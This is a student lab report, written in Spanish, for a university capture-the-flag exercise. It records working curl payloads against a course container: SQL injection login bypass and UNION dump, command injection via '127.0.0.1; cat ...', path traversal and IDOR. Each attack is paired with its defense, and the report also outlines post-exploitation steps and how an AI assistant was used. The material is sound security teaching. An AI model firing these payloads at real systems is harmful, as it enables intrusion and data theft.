# Informe — Laboratorio 07 · Explotación

**Grupo:** 14 · **Integrantes:** Fede Perón — fedeeperon · Laureano Gomez Redondo — Laureano-GR · Martín Cesano — martincesano · Martín Gaido — martingaidoo · Valentina Chiapero — valechiapero
**Fecha:** 2026-11-19

## 0. Declaración de uso de IA

La explotación de PhantomCorp, el armado de cada payload y el análisis de los
resultados fueron realizados por el grupo. Usamos un asistente de IA como apoyo,
revisando y validando todo lo que producía.

- **Herramienta:** Claude Code (Claude Opus).
- **Para qué la usamos (apoyo):** para levantar y verificar el entorno Docker del
  lab (`make lab N=07`), para agilizar la ejecución de los `curl` contra el
  contenedor `phantomcorp` de la cátedra, para ordenar las salidas reales en la
  tabla de explotación y para redactar un primer borrador de este informe y del
  `research.md`.
- **Qué hicimos nosotros (trabajo manual):** decidimos qué técnica aplicar en cada
  reto, construimos cada payload a mano (no con sqlmap), interpretamos los errores
  SQL verbosos del servidor para afinar el `UNION`, reconstruimos la
  consulta/comando/ruta de cada vulnerabilidad, clasificamos el impacto y
  redactamos las defensas y las respuestas P1–P5.
- **Cómo verificamos que era correcto:** cada flag salió de la respuesta real del
  servidor (no del `solucion.md` ni de leer `server.py`) y se validó contra el
  hash SHA-256 del `retos.manifest` vía `./ctf submit`. Resultado final:
  `./ctf status 07` → 5/5.

## 1. Flags capturadas

Salida de `./ctf status 07`:

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ✓  R3     Inyeccion de comandos (RCE)
   ✓  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 07 COMPLETO!
```

| Reto | Técnica | Flag |
|---|---|---|
| R1 | SQLi — bypass de autenticación | `FLAG{sqli_auth_bypass}` |
| R2 | SQLi — extracción con UNION | `FLAG{sqli_union_dump}` |
| R3 | Inyección de comandos (RCE) | `FLAG{command_injection_rce}` |
| R4 | Path traversal / LFI | `FLAG{path_traversal_lfi}` |
| R5 | IDOR — control de acceso roto | `FLAG{idor_broken_access}` |

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi auth (R1) | en `user`: `admin' -- ` (pass cualquiera) | `SELECT ... FROM users WHERE user='admin' -- ' AND pass='x'` → el `-- ` comenta el chequeo de `pass` | Acceso como **admin** sin su contraseña; panel de administración desbloqueado | **Consultas parametrizadas** (placeholders `?`), nunca concatenar el input en la query |
| SQLi UNION (R2) | en `q`: `zzz' UNION SELECT clave, valor FROM secrets -- ` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%zzz%' UNION SELECT clave, valor FROM secrets -- ...` | Volcado de la tabla `secrets` (y del esquema vía `sqlite_master`); exfiltración arbitraria de la BD | Parametrizar + **principio de mínimo privilegio** del usuario de BD; no devolver errores SQL verbosos al cliente |
| Command injection (R3) | en `host`: `127.0.0.1; cat /app/flags/cmdi.txt` | `sh -c "ping -c1 127.0.0.1; cat /app/flags/cmdi.txt"` → el `;` encadena un segundo comando | **RCE**: ejecución de comandos arbitrarios en el servidor con el user del servicio | No pasar input a la shell; usar API sin shell (`subprocess` con lista de args, `shell=False`) + **lista blanca** de hosts |
| Path traversal (R4) | en `archivo`: `../flags/lfi.txt` | `open("/app/public/" + "../flags/lfi.txt")` → resuelve a `/app/flags/lfi.txt`, fuera de `public/` | Lectura de archivos arbitrarios del servidor fuera del directorio previsto | **Normalizar y validar** la ruta (`realpath` y verificar que cae bajo `public/`); lista blanca de nombres; rechazar `..` |
| IDOR (R5) | `id=1` (el perfil propio es `id=3`) | `GET /perfil?id=1` → devuelve el perfil del admin sin comprobar el dueño | Acceso a datos de otros usuarios (incluida la `nota_privada` del admin) | **Control de acceso del lado del servidor**: verificar que el recurso pertenece al usuario autenticado (denegar por defecto) |

### Salidas de soporte (curl reales)

**R1 — SQLi bypass de autenticación (`POST /login`):**
```
$ curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"
Bienvenido admin (rol: admin).
Panel de administracion desbloqueado: FLAG{sqli_auth_bypass}
```

**R2 — SQLi UNION (`GET /buscar`).** Primero el esquema con `sqlite_master`, luego el dump:
```
$ curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master -- "
Resultados:
  productos - $CREATE TABLE productos(nombre TEXT, precio TEXT)
  secrets - $CREATE TABLE secrets(clave TEXT, valor TEXT)
  users - $CREATE TABLE users(id INTEGER, user TEXT, pass TEXT, rol TEXT, nota_privada TEXT)

$ curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets -- "
Resultados:
  flag_union - $FLAG{sqli_union_dump}
```
*(Una comilla suelta en `q` devuelve `Error SQL: unrecognized token: "'"` — ese error verboso confirmó la inyección y nos dejó afinar el UNION a 2 columnas.)*

**R3 — Command injection (`GET /herramientas/ping`):**
```
$ curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"
$ ping -c1 127.0.0.1; cat /app/flags/cmdi.txt
FLAG{command_injection_rce}
```

**R4 — Path traversal (`GET /descargar`):**
```
$ curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"
FLAG{path_traversal_lfi}

# la base se confirma por el mensaje de error de una ruta inválida:
# No se pudo abrir: [Errno 2] ... '/app/public/../../flags/lfi.txt'
```

**R5 — IDOR (`GET /perfil`):**
```
$ curl -s -G http://phantomcorp/perfil --data-urlencode "id=1"
{"id": 1, "user": "admin", "rol": "admin", "nota_privada": "Nota del admin: FLAG{idor_broken_access}"}
```

## 3. Preguntas de análisis

**P1 — Por qué funciona el bypass (con la query).**
El login arma la consulta concatenando el input:
`SELECT user, rol FROM users WHERE user='<user>' AND pass='<pass>'`. Con
`user = admin' -- ` la consulta queda
`SELECT user, rol FROM users WHERE user='admin' -- ' AND pass='x'`. En SQL, `--`
inicia un **comentario de línea**: todo lo que va después (incluido
` ' AND pass='x'`) se descarta. La consulta efectiva pasa a ser
`... WHERE user='admin'`, que devuelve la fila del admin **sin verificar la
contraseña**. Nuestro dato (`admin' -- `) dejó de ser un valor y se volvió parte
de la estructura de la consulta.

**P2 — Por qué el UNION necesita igual número de columnas.**
`UNION` combina los resultados de dos `SELECT` en una sola tabla, y para eso las
dos consultas deben tener la **misma cantidad de columnas** (y tipos
compatibles): cada fila del segundo `SELECT` se apila bajo las columnas del
primero. Si no coinciden, el motor tira error. La consulta original del buscador
devolvía dos columnas (nombre y precio del producto), así que el UNION tiene que
traer también dos. Si no supiéramos que son dos, lo averiguaríamos probando
`UNION SELECT NULL -- `, `UNION SELECT NULL,NULL -- `, etc., y viendo con cuántas
`NULL` deja de dar error (o con `ORDER BY 1`, `ORDER BY 2`, … hasta que falle: el
último número que funciona es la cantidad de columnas).

**P3 — Qué sigue después del RCE (R3).**
Con ejecución de comandos, un atacante real busca **persistencia y escalada**
(lo que viene en el Lab 08, post-explotación): reconocer el host (`id`,
`whoami`, `uname -a`), buscar credenciales (`.env`, historiales, archivos de
config), escalar privilegios (binarios SUID, `sudo -l`) y dejar un acceso estable
(una reverse shell, una clave SSH en `authorized_keys`, un cron). La flag es solo
la prueba de concepto; el valor real del RCE es que convierte "entré" en
"me quedo y soy root".

**P4 — Por qué parametrizar mata la SQLi.**
Una consulta parametrizada (`... WHERE user = ?`, pasando el valor aparte) hace
que el motor **compile primero la estructura de la consulta** y recién después
reciba el input como un **dato puro**, nunca como parte del SQL. El input viaja
por un canal separado del código: por más comillas, `--` o `UNION` que mande, el
motor lo trata como el contenido literal de un campo, no como instrucciones. Se
elimina de raíz la confusión datos/código que es la causa de la inyección —
la defensa no "filtra caracteres malos", sino que **separa los canales**.

**P5 — Dónde va el control de acceso (IDOR).**
El control de acceso **tiene que ir en el servidor**, en cada request, no en el
cliente. El IDOR del R5 existe porque el servidor devuelve el perfil del `id`
pedido sin preguntarse "¿este perfil es del usuario que está autenticado?".
Confiar en que el cliente "no cambie el id" no es control: el atacante controla
por completo lo que manda (edita la URL, usa `curl`). La verificación —el recurso
`id` pertenece al usuario de la sesión, o la sesión tiene rol para verlo— debe
hacerse del lado del servidor y **denegar por defecto** si no se cumple.

## 4. Bitácora de comandos

```bash
# Entorno (desde la raíz del repo)
make lab N=07                 # levanta atacante + target phantomcorp
make shell                    # entra a la consola del atacante (o: docker exec -it cyberlab-attacker bash)

# R1 — SQLi bypass de autenticación
curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' -- " --data-urlencode "pass=x"

# R2 — SQLi UNION (esquema + dump)
curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT name, sql FROM sqlite_master -- "
curl -s -G http://phantomcorp/buscar --data-urlencode "q=zzz' UNION SELECT clave, valor FROM secrets -- "

# R3 — Command injection
curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"

# R4 — Path traversal
curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"

# R5 — IDOR
curl -s -G http://phantomcorp/perfil --data-urlencode "id=1"

# Entrega de flags
./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
./ctf submit 07 R2 'FLAG{sqli_union_dump}'
./ctf submit 07 R3 'FLAG{command_injection_rce}'
./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
./ctf submit 07 R5 'FLAG{idor_broken_access}'
./ctf status 07
```
